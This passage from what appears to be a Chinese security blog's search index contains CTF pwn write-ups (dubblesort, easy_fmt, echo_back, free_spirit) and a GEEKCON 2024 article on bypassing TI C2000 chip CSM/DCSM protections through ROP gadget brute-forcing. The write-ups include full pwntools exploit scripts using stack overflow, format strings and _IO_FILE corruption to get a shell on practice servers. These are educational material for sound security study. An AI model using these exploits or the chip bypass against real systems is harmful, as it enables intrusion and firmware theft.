process(&#x27;./diary_mna_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,26394)      offset = 0x5 &lt;&lt; 20 #remote offset=0x5ee500      offset += x &lt;&lt; 12      offset += 0x500      print hex(offset)      exploit(offset)      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["unlink","off by one","IO FILE","retf沙箱绕过"]},{"title":"dubblesort","url":"/2019/11/18/dubblesort/","content":"首先看一下程序的保护机制\n\n\n保护全开，并且是一个32位程序\n然后，我们用IDA分析一下\n\n\n这里，有两个漏洞\n第一个是在调用read之前，[没有调用memset对buf清空，因此，buf里可能之前会有一些残留的关键数据]{.mark}\n第二个是，[输入的整数个数没有上限，可以造成数据溢出，其实也就是栈溢出。]{.mark}\n我们在read断点，然后观察栈中的数据，发现数据还未输入时，栈里就有一些关键数据\n\n\n我们可以输入7 * 4 &#x3D; 28个字符，然后printf时，就会把接下来的数据打印出来，直到遇x00\n\n\n泄露这个数据后(当前为0xF7797244)，然后我们找到libc的基地址，当前为0xF75E9000\n\n\n然后我，我们算的它们之间的偏移\nOff &#x3D; 0xF7797244 - 0xF75E9000 &#x3D;\n于是，我们就这样泄露libc地址\n#泄露地址并计算出libc的地址  payload = &#x27;a&#x27;*0x1C  sh.sendafter(&#x27;name :&#x27;,payload)  sh.recvuntil(payload)  #计算libc加载地址  libc_base = u32(sh.recv(4)) - off  system_addr = libc_base + libc.sym[&#x27;system&#x27;]  binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()\n\n接下来，我们来做一个实验，让我们先抛开本题，来看看这样的代码\n#include &lt;stdio.h&gt;  int main() &#123;      int a = 10;      while (true) &#123;          scanf(&quot;%u&quot;,&amp;a);          printf(&quot;%u\\n&quot;,a);      &#125;  &#125;  \n\n然后，我们发现,[当我们输入+或-符号，scanf就直接跳过了对a的输入]{.mark}\n\n\n经过测试,[%u、%x、%d等都有这种特性]{.mark}\n然后，我们继续分析此题，\n\n\n我们接下来会输入n个整数，存入v13的空间处,而v13在ebp-0x70处,v15存的是canary的值，它位于ebp-0x10处，[我们不能把canary的值给改了，我们需要保留它，因此，我们先输入(0x70-0x10)&#x2F;4 &#x3D; 24个整数，然后接下来输入+或-号，跳过当前输入]{.mark}，然后我们到达ebp-0xC处，距离返回地址ebp+0x4还差0x10&#x2F;4&#x3D;4个，因此，我们继续输入4个整数，接下来，我们再输入ROP即可\n注意，本题IDA分析出来的位置相对于ebp不准，但是各个变量之间的相对关系还是准的\n[实际，距离返回地址ebp+0x4还差7个，调试调试就知道了]{.mark}\n由于，我们输入的数据会做一遍升序排序，所以，为了保留我们输入的顺序，我们前24个数据都输入0，然后[输入+或-跳过canary]{.mark}，然后输入(7 + 1 + 1)个system的地址整数值，然后输入一个binsh_addr的整数值，程序退出main后，便执行shell\n因为system_addr总是小于binsh_addr，而这两个地址值一般大于canary的值，canary是个随机生成的数，如果有时不满足这个大小关系，只需重新执行程序，多试几次即可。\n于是，我们最终的exp脚本是这样的\n#coding:utf8  from pwn import *    sh = process(&#x27;./dubblesort&#x27;,env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc_32.so.6&quot;&#125;)  #sh = remote(&#x27;111.198.29.45&#x27;,57605)  libc = ELF(&#x27;./libc_32.so.6&#x27;)  off = 0x1AE244    #泄露地址并计算出libc的地址  payload = &#x27;a&#x27;*0x1C  sh.sendafter(&#x27;name :&#x27;,payload)  sh.recvuntil(payload)  #计算libc加载地址  libc_base = u32(sh.recv(4)) - off  system_addr = libc_base + libc.sym[&#x27;system&#x27;]  binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()    print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)    n = 35  sh.sendlineafter(&#x27;sort :&#x27;,str(n))    for i in range(0,n-11):     sh.sendlineafter(&#x27;number :&#x27;,str(0))    sh.sendlineafter(&#x27;number :&#x27;,&#x27;+&#x27;)    for i in range(0,9):     sh.sendlineafter(&#x27;number :&#x27;,str(system_addr))  sh.sendlineafter(&#x27;number :&#x27;,str(binsh_addr))    sh.interactive()  \n\n本题告诉我们，\n用read读取数据到缓冲区前，先对缓冲区初始化\n数组要检查下标越界\n","categories":["CTF"],"tags":["栈溢出","sscanf"]},{"title":"easy_fmt","url":"/2020/02/05/easy_fmt/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n存在一个明显的格式化字符串漏洞，但是只能用一次，后面exit(0)会结束程序\n\n\nCheckIn需要爆破\n\n\n是一个随机数，且只有一位，我们直接输入2，成功率1&#x2F;10\n为了不让程序退出，多次利用printf，我们就得利用第一次的printf把exit的got表内容修改为0x400982，这样，我们就能一直处于一个循环，多次利用printf\n\n\n由于RELRO为Partial RELRO，是延迟绑定，因此，exit的got表初始值为这个\n\n\n因此，我们只需要修改后两字节\n#修改exit的got表，指向main+0x7C处，即形成一个循环，这样我们能继续使用printf  payload = &#x27;%&#x27; + str(0x982) + &#x27;c%10$hn&#x27;  payload = payload.ljust(16,&#x27;b&#x27;) + p64(exit_got)  sh.sendline(payload)  \n\n接下来，为了得到system地址，我们准备泄露read函数地址，得到libc版本即基地址\n#泄露read地址  payload = &#x27;%10$sBBB&#x27; + p64(read_got)  sh.recvuntil(&#x27;slogan: &#x27;)  sh.sendline(payload)  sh.recvuntil(&#x27;slogan: &#x27;)  sh.recv(1)  read_addr = u64(sh.recvuntil(&#x27;BBB&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  libc = LibcSearcher(&#x27;read&#x27;,read_addr)  libc_base = read_addr - libc.dump(&#x27;read&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  \n\n接下来，我们需要修改printf的got表内容，指向system即可\n综上，我们的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./easy_fmt&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,53528)  elf = ELF(&#x27;./easy_fmt&#x27;)  printf_got = elf.got[&#x27;printf&#x27;]  read_got = elf.got[&#x27;read&#x27;]  exit_got = elf.got[&#x27;exit&#x27;]    sh.sendlineafter(&#x27;enter:&#x27;,&#x27;2&#x27;)    #修改exit的got表，指向main+0x7C处，即形成一个循环，这样我们能继续使用printf  payload = &#x27;%&#x27; + str(0x982) + &#x27;c%10$hn&#x27;  payload = payload.ljust(16,&#x27;b&#x27;) + p64(exit_got)  sh.sendline(payload)    #泄露read地址  payload = &#x27;%10$sBBB&#x27; + p64(read_got)  sh.recvuntil(&#x27;slogan: &#x27;)  sh.sendline(payload)    sh.recvuntil(&#x27;slogan: &#x27;)  sh.recv(1)    read_addr = u64(sh.recvuntil(&#x27;BBB&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  #print hex(read_addr)  libc = LibcSearcher(&#x27;read&#x27;,read_addr)  libc_base = read_addr - libc.dump(&#x27;read&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)    #修改printf的got表，只需修改低3字节即可到system  data = system_addr &amp; 0xFF  payload = &#x27;%&#x27; + str(data) + &#x27;c%14$hhn&#x27;  data = ((system_addr &amp; 0xFFFFFF) &gt;&gt; 8) - data  payload += &#x27;%&#x27; + str(data) + &#x27;c%15$hn&#x27;  payload = payload.ljust(32,&#x27;B&#x27;) + p64(printf_got) + p64(printf_got+1)  sh.recvuntil(&#x27;slogan: &#x27;)  sh.sendline(payload)    #get shell  sh.sendlineafter(&#x27;slogan: &#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["格式化字符串漏洞"]},{"title":"echo_back","url":"/2019/11/17/echo_back/","content":"首先，检查一下程序的保护机制,发现保护全开\n\n\n然后，我们用IDA分析一下，\n在功能2有一个明显的格式化输出字符串漏洞\n\n\n但是，我们能够输入的字符串长度最多为7个字符\n\n\n好啦，不管怎么说，首先得用这个漏洞泄露一些地址\n当我们要执行printf时，我们发现，距离当前栈顶13个位置处，有__libc_start_main+F0的地址，但是，这不是说要输出它的值就用%13$p，我们得从13开始，不断加1，测试，最终我们得到了这个数据的位置为%19$p，于是，我们就可以泄露__libc_start_main+F0的地址了，然后就能计算出libc的加载地址\n\n\n于是，我们就先泄露它，算出一些需要用到的地址\nechoback(&#x27;%19$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  #泄露__libc_start_main的地址  __libc_start_main = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16) - 0xF0  #得到libc加载的基地址  libc_base = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]  system_addr = libc_base + libc.sym[&#x27;system&#x27;]  binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()  \n\n同理，我们泄露出main的地址，计算出程序的加载地址以及pop rdi的地址，用于给system传参\n#泄露main的地址  echoback(&#x27;%13$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  main_addr = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16) - 0x9C  elf_base = main_addr - main_s_addr  pop_rdi = elf_base + pop_s_rdi  \n\n接下来，我们直接想到，用格式化字符串漏洞修改main函数的返回地址,也就是修改%19$p处的数据\n\n\n但是，我们知道，%19$n不可行，因为%19$n是把%19$p的数据当成一个地址，然后往那个地址里写数据,也就是说，它会把如图0x7F8854AD7830当成一个地址，往这个地址里写数据，而我们希望的是它往如图0x7FFDCBDF94A8地址处写数据，那么，我们首先得暴露出它的值，但是，栈里面也没有这个数据啊。然而，却有main函数的rbp数据\n\n\n我们只需泄露main的rbp的值，然后加8就得到了存放(main函数返回地址)的位置\nechoback(&#x27;%12$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  #泄露main的ebp的值  main_ebp = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16)  #泄露存放(main返回地址)的地址  main_ret = main_ebp + 0x8  \n\n接下来，我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符。这些，我们想到了功能1，setName，它不是白放那里的，它有着重要的作用。\n\n\n它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0\n然后，我们发现，%16$p输出的就是a1的数据。\n于是，我们就可以先setName(p64(addr))，然后利用%16$n来对addr处写数据\n然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7\n于是，我们就需要用到一个新知识了，为了绕过7个字符的限制，我们换一个思路，我们利用printf漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码了。\n_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_;   ```  首先，scanf最终是从stdin中读取数据，而stdin是一个FILE (_IO_FILE) 结构体指针。我们再来看看FILE的结构```C/* The tag name of this struct is _IO_FILE to preserve historic    C++ mangled names for functions taking FILE* arguments.    That name should not be used in new code.  */  struct _IO_FILE  &#123;    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */      /* The following pointers correspond to the C++ streambuf protocol. */    char *_IO_read_ptr;   /* Current read pointer */    char *_IO_read_end;   /* End of get area. */    char *_IO_read_base;  /* Start of putback+get area. */    char *_IO_write_base; /* Start of put area. */    char *_IO_write_ptr;  /* Current put pointer. */    char *_IO_write_end;  /* End of put area. */    char *_IO_buf_base;   /* Start of reserve area. */    char *_IO_buf_end;    /* End of reserve area. */      /* The following fields are used to support backing up and undo. */    char *_IO_save_base; /* Pointer to start of non-current get area. */    char *_IO_backup_base;  /* Pointer to first valid character of backup area */    char *_IO_save_end; /* Pointer to end of non-current get area. */      struct _IO_marker *_markers;      struct _IO_FILE *_chain;      int _fileno;    int _flags2;    __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */      /* 1+column number of pbase(); 0 is unknown. */    unsigned short _cur_column;    signed char _vtable_offset;    char _shortbuf[1];      _IO_lock_t *_lock;  #ifdef _IO_USE_OLD_IO_FILE  &#125;;  \n\n让我们再看看文件的读取过程**_IO_new_file_underflow 这个函数最终调用了_IO_SYSREAD系统调用来读取文件。在这之前，它做了一些处理**\nint  _IO_new_file_underflow (FILE *fp)  &#123;    ssize_t count;      /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)      return EOF;      if (fp-&gt;_flags &amp; _IO_NO_READS)      &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;      &#125;    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)      return *(unsigned char *) fp-&gt;_IO_read_ptr;      if (fp-&gt;_IO_buf_base == NULL)      &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_IO_save_base != NULL)      &#123;        free (fp-&gt;_IO_save_base);        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;      &#125;        _IO_doallocbuf (fp);      &#125;      /* FIXME This can/should be moved to genops ?? */    if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))      &#123;        /* We used to flush all line-buffered stream.  This really isn&#x27;t      required by any standard.  My recollection is that      traditional Unix systems did this for stdout.  stderr better      not be line buffered.  So we do just that here      explicitly.  --drepper */        _IO_acquire_lock (_IO_stdout);          if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))        == (_IO_LINKED | _IO_LINE_BUF))      _IO_OVERFLOW (_IO_stdout, EOF);          _IO_release_lock (_IO_stdout);      &#125;      _IO_switch_to_get_mode (fp);      /* This is very tricky. We have to adjust those      pointers before we call _IO_SYSREAD () since      we may longjump () out while waiting for      input. Those pointers may be screwed up. H.J. */    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end      = fp-&gt;_IO_buf_base;      count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,                 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);    if (count &lt;= 0)      &#123;        if (count == 0)      fp-&gt;_flags |= _IO_EOF_SEEN;        else      fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;    &#125;    fp-&gt;_IO_read_end += count;    if (count == 0)      &#123;        /* If a stream is read to EOF, the calling application may switch active      handles.  As a result, our offset cache would no longer be valid, so      unset it.  */        fp-&gt;_offset = _IO_pos_BAD;        return EOF;      &#125;    if (fp-&gt;_offset != _IO_pos_BAD)      _IO_pos_adjust (fp-&gt;_offset, count);    return *(unsigned char *) fp-&gt;_IO_read_ptr;  &#125;  \n\n让我们，看看代码的第58行(标红处)，系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base\n[要是我们能够修改**_IO_buf_base和_IO_buf_end** 那么我们不就可以实现任意位置无限制长度的写数据了吗？]{.mark}\n我们首先需要定位到**IO_2_1_stdin结构体在内存中的位置，然后再定位到_IO_buf_base** 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr &#x3D; _IO_buf_base + 0x8 * 7\n_IO_2_1_stdin_ = libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]  _IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  _IO_buf_base = _IO_2_1_stdin_addr + 0x8 * 7  \n\n接下来，做什么呢？\n我们先来看看_IO_buf_base的值吧\n先是stdin的位置,当前位于0x7F9EA22488E0\n\n\n然后是_IO_buf_base，它位于0x7F9EA22488E0 + 0x8 * 7 &#x3D; 0x7F9EA2248918 ，它的值为0x7F9EA2248963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x7F9EA2248900 ，也就是0x7F9EA22488E0 + 0x8 * 4处，跑到了**[结构体内部去了]{.mark}，也就是结构体中的第5个数据处，也就是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x7F9EA2248900处向后**输入0x64-0x00 &#x3D; 0x64个字符，那么我们就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，那么我们就能绕过7个字符的输入限制\n_IO_buf_base\n\n\n_IO_buf_end\n\n\n那么，我们先来覆盖_IO_buf_base的低1字节为0\nsetName(p64(_IO_buf_base))  #覆盖_IO_buf_base的低1字节为0  echoback(&#x27;%16$hhn&#x27;)  \n\n接下来，我们就可以覆盖结构体里的一些数据了\n对于_IO_buf_base之前的数据(_IO_write_base、_IO_write_ptr、_IO_write_end)，我们最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，我们覆盖_IO_buf_base和_IO_buf_end，\n于是，我们的payload\npayload = p64(0x83 + _IO_2_1_stdin_addr)*3 + p64(main_ret) + p64(main_ret + 0x8 * 3)  sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;2&#x27;)  sh.sendafter(&#x27;length:&#x27;,payload)  \n\n我们为什么在length:后面发送payload，因为这个地方用到了scanf\n\n\n现在，我们**[得绕过一个判断，这样调用scanf输入数据时，就会往目标处输入数据]{.mark}**\n\n\n由于之前，我们覆盖结构体数据时，后面执行了这一步，使得fp-&gt;_IO_read_end +&#x3D; len(payload)\n\n\n而getchar()的作用是使fp-&gt;_IO_read_ptr加1\n由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，因此，我们还需要执行len(payload)-1次getchar()，然后接下来发送我们的rop即可获得shell\n我们最终的exp脚本\n#coding:utf8  from pwn import *  import time     libcpath = &#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;  #sh = process(&#x27;./echo_back&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,48430)  elf = ELF(&#x27;./echo_back&#x27;)  libc = ELF(libcpath)  #main在elf中的静态地址  main_s_addr = 0xC6C  #pop rdi  #retn  #在elf中的静态地址  pop_s_rdi = 0xD93     _IO_2_1_stdin_ = libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]        def echoback(content):     sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;length:&#x27;,&#x27;7&#x27;)     sh.send(content)     def setName(name):     sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;1&#x27;)     sh.sendafter(&#x27;name:&#x27;,name)           echoback(&#x27;%19$p&#x27;)     sh.recvuntil(&#x27;0x&#x27;)  #泄露__libc_start_main的地址  __libc_start_main = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16) - 0xF0  #得到libc加载的基地址  libc_base = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]  system_addr = libc_base + libc.sym[&#x27;system&#x27;]  binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()  _IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  _IO_buf_base = _IO_2_1_stdin_addr + 0x8 * 7     print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;iobase=&#x27;,hex(_IO_buf_base)     #泄露main的地址  echoback(&#x27;%13$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  main_addr = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16) - 0x9C  elf_base = main_addr - main_s_addr  pop_rdi = elf_base + pop_s_rdi  print &#x27;elf base=&#x27;,hex(pop_rdi)     echoback(&#x27;%12$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  #泄露main的ebp的值  main_ebp = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16)  #泄露存放(main返回地址)的地址  main_ret = main_ebp + 0x8     setName(p64(_IO_buf_base))  #覆盖_IO_buf_base的低1字节为0  echoback(&#x27;%16$hhn&#x27;)     #修改_IO_2_1_stdin_结构体  payload = p64(0x83 + _IO_2_1_stdin_addr)*3 + p64(main_ret) + p64(main_ret + 0x8 * 3)  sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;2&#x27;)  sh.sendafter(&#x27;length:&#x27;,payload)  sh.sendline(&#x27;&#x27;)  #不断调用getchar()使fp-&gt;_IO_read_ptr与使fp-&gt;_IO_read_end相等  for i in range(0,len(payload)-1):     sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;length:&#x27;,&#x27;&#x27;)     #对目标写入ROP  sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;2&#x27;)  payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  sh.sendafter(&#x27;length:&#x27;,payload)  #这个换行最好单独发送  sh.sendline(&#x27;&#x27;)  #getshell  sh.sendlineafter(&#x27;choice&gt;&gt;&#x27;,&#x27;3&#x27;)     sh.interactive()  ","categories":["CTF"],"tags":["格式化字符串漏洞","IO FILE"]},{"title":"free_spirit（在栈上爆破一个可以被free的fake_chunk）","url":"/2020/07/01/free_spirit/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，功能3存在8字节溢出，将会把v7下面的buf指针覆盖掉，而覆盖了buf指针，就能实现任意地址写。\n\n\n\n\n那么，我们劫持函数栈返回地址为one_gadget即可，为了绕过结尾对buf的检查，我们的buf非0，且free后不会报错。\n\n\n但是我们泄露不了堆地址，因此，只能在栈上找一个合适的fake_chunk，因此，可以直接在栈上爆破，直到程序不崩溃，那么就可以执行one_gadget了。\n#coding:utf8from pwn import *backdoor = 0x0000000000400A3Ei = -54while True:   try:      #sh = process(&#x27;./free_spirit&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,29949)      i -= 1      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)      sh.recvuntil(&#x27;0x&#x27;)      stack_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)      print &#x27;stack_addr=&#x27;,hex(stack_addr)      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)      sleep(0.5)      sh.send(&#x27;a&#x27;*0x8 + p64(stack_addr + 0x58) + &#x27;\\x00&#x27;*0x10)      sleep(0.5)      #8字节溢出，覆盖buf指针，造成任意地址写      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)      sh.sendline(p64(backdoor) + p64(stack_addr + i * 8))      #8字节溢出，覆盖buf指针，使得free不报错      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)      #raw_input()      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;0&#x27;)      sh.interactive()   except:      print &#x27;trying...&#x27;      sh.close()","categories":["CTF"],"tags":["栈溢出","爆破"]},{"title":"GEEKCON 2024 TI C2000 DSP Chip Hacking： 绕过德州仪器C2000芯片的CSM/DCSM安全保护机制","url":"/2024/05/30/geekcon2024-singapore-chip/","content":"2024年5月25日，奇安信天工实验室安全研究员赵海，出席国际知名极客大会GEEKCON 2024 INTERNATIONAL，发表《TI C2000 DSP Chip Hacking》的议题演讲并作技术展示。\n议题披露了TI C2000 DSP芯片下隐藏了20多年之久的CSM&#x2F;DCSM锁密机制绕过漏洞，该漏洞由于设计缺陷难以修复。\n芯片介绍DSP芯片（Digital Signal Processing Chip）是一种专门用于数字信号处理的微处理器或微控制器。C2000™产品作为TI乃至业界最为悠久的MCU产品线之一，至今已有25年历史，从高铁到电动汽车、从数控机床到机械臂、从逆变器到服务器，哪里都有C2000的身影。TMS320F28x是C2000系列中最新的一批芯片，目前广泛使用。\n\nCSM保护机制代码安全模块(CSM)是C2000芯片内置的一种数据访问保护机制，开发者在芯片指定位置刷入CSM密码给芯片上锁，可以防止内部flash中的固件被UnSecureZone(JTAG调试器、BOOTROM等)读取。\nTMS320F28x系列CSM密码为128位（8个16位字），分别是KEY0、KEY1、KEY2、KEY3到KEY7，映射到 FLASH 的地址中，这一地址位置是由 TI 设计的时候设计好的，使用者不能改变，如果加密位置都为 1,那么该芯片为非加密状态，可以访问用户存储区，如果加密位在全 0 的状态，该芯片就处于锁死状态，无法继续使用。\n在芯片处于加密状态，无论是使用硬件的 JTAG 调试还是软件指令去读取加密区，得到的结果都是 0。如下使用JTAG调试器查看内存数据，此处看似是空数据，实际上这里是被CSM保护的内存区域，在不知道密码的情况下无法被读取。\n\n使用CSM密码解锁后，可以正常读取到数据\n\nCSM机制的流程如图所示，如果要访问SecureZone区，则需要使用CSM密码进行unlock，unlock的过程是在硬件中实现的，用户只需要对相关硬件寄存器传入密码即可自动进行。为了防止在运行时调试器附加提取数据，CSM机制规定了UnsecureZone无需解锁可以直接执行SecureZone中的代码，因此BOOTROM在启动固件时，也不需要知道密码。\n\n\nDCSM保护机制双代码安全模块(DCSM)存在于C2000系列中一些新推出的型号产品，该功能支持将芯片中的memory划为两个独立区域(SecureZone1、SecureZone2)，并设置各自独立的的128位CSM密码进行保护。通过烧写DCSM相关寄存器，可以对内存区域进行划分保护，例如将Flash Sector A、Sector C、RAMLS01划分到SecureZone1，Flash Sector B、Sector D、RANLS02、RAMLS03划分到SecureZone2。带有DCSM机制的芯片还具有SecureROM，这是内置于芯片中的一段代码，提供了一些对DCSM保护区操作的API函数，例如SafeCrc函数可以在无需解锁CSM的情况下被UnSecureZone中的代码调用计算一个SecureZone中数据的CRC。\n\n\nCSM&#x2F;DCSM解锁知道了CSM的加锁方式，对研究CSM解锁思路就有两条。第一，想办法得到128位密码，如果拥有了密码，那么就可以访问用户存储区。第二，在无法得到的情况下如何让芯片编程不加密状态呢？刚才说过如果是全为1就为不加密状态，那么就想办法让该位置全变为 1，只要达到了这个状态，就破解掉了DSP的加密。市面上的芯片解密公司使用的是第二种方法：将芯片开盖，使用高精密仪器修改 OTP 存储区的电路，让加密位全部置 1 达到解密的状态。\n\n这种解锁方式造价高且流程复杂容易毁坏芯片。我们研究发现CSM&#x2F;DCSM在软件层面上存在漏洞，保护区的数据可以利用漏洞间接访问。\nCSM&#x2F;DCSM安全漏洞前面在介绍CSM时提到可以在无需解锁的情况下去执行SecureZone中的代码，漏洞在于可以执行SecureZone中任意地址的代码即使该地址不是一个函数的开头位置。\n\nSecureZone内部的代码是有权限直接访问这个SecureZone本身的数据的，因此可以调用内部的一些ROP Gadgets去间接读写这个SecureZone。如图所示，调用了MOVL ACC,*+XAR5[0]这样的一个内存加载的gadget，可以读取SecureZone中4字节数据到ACC寄存器中。而MOVL *+XAR4[0], ACC这样的数据存储的gadget则可以被用于写SecureZone。\n\n由于事先不知道SecureZone的内容，那么如何获取gadget的地址是一个问题。将思路转变为CTF的盲打题，我们可以直接从一块未知内容区爆破出想要的ROP Gadget。如下图流程所示，我们使用BOOTROM的下载模式上传我们的代码到RAM执行，想要爆破出数据加载到寄存器的gadget，先在一个地址处存入数据，例如在0x100地址处存入一个Magic Value，接着设置寄存器XAR4、XAR5寄存器（这两个寄存器出现在内存读写的指令中比较频繁）为地址0x100，清空其他寄存器，然后从SecureZone开始的位置进行函数调用执行，如果执行错误没有成功返回，则说明当前地址不是我们需要的，下一轮对函数地址增1继续调用；如果函数调用成功返回，则检查哪一个寄存器中的值变成了Magic Value，如果有，说明我们成功找到一个能够从内存加载数据到寄存器的gadget，利用这个gadget可以把数据全部读取，然后反汇编后寻找内存写的gadget。\n\nCSM&#x2F;DCSM保护机制都可以使用这种方式来绕过读写保护，由于DCSM增加了SecureROM且SecureROM拥有对SecureZone的读写权限，我们也可以去调用SecureROM中的gadgets。SecureROM无法被JTAG提取但是可以在TI官方的C2000Wave SDK包中找到二进制文件，可以对其进行逆向提取需要的ROP gadgets，这样无需爆破，且适配多种产品而不依赖于flash中的代码变化。\n\n\nEXEONLY保护绕过如果对DCSM中的EXEONLY寄存器进行烧写，可以对指定内存进行只可执行保护，例如设置Flash Sector A、RAMLS01为EXEONLY，开了该保护，即使同一个SecureZone的代码也不能对EXEONLY保护区进行读写，因此上面的绕过方法就失效了。\n\n翻阅德州仪器官方的文档，SecureROM提供了两个API可以对EXEONLY区进行读写，但是参数有很严格的限制，也不能被利用。\n\n通过对SecureROM的逆向分析，我们发现内部的关键代码\n_SafeCopyCodeZ1:...MOVW DP, #0x17c0OR @0x22, #0x0001...do some R/W\n这里地址计算一下，实际上是对0x5f022地址处写入了一个标志位1，然后就可以正常的进行读写了。经过测试，写入标志位和读写数据必须由SecureROM中的代码来完成才能成功，并且两个操作中途不能返回到UnSecureZone中否则也会失败。我们可以使用ROP来完成这个操作。\n\n我们找到了合适的gadgets，先用VMOV32 *+XAR5[0], VCC来设置标志位，然后ROP到数据拷贝的gadget处。\nFlash刷写保护绕过对于开了CSM保护的芯片，我们可以利用漏洞读取位于Sector A中的CSM密码，然后进行解锁即可直接刷写flash。对于DCSM，密码在OTP中不可被读取，但是可以在不解锁的情况下刷写flash：在同一个SecureZone中的代码，如果设置了DcsmCommonRegs.FLSEM.all = 0xA501;这个特殊的寄存器，则后续代码可以直接刷写flash。我们可以先利用漏洞绕过DCSM的读写保护，将flash刷写代码写入到SecureZone中的RAM区，然后再去执行RAM中的代码即可对同一个SecureZone中的flash 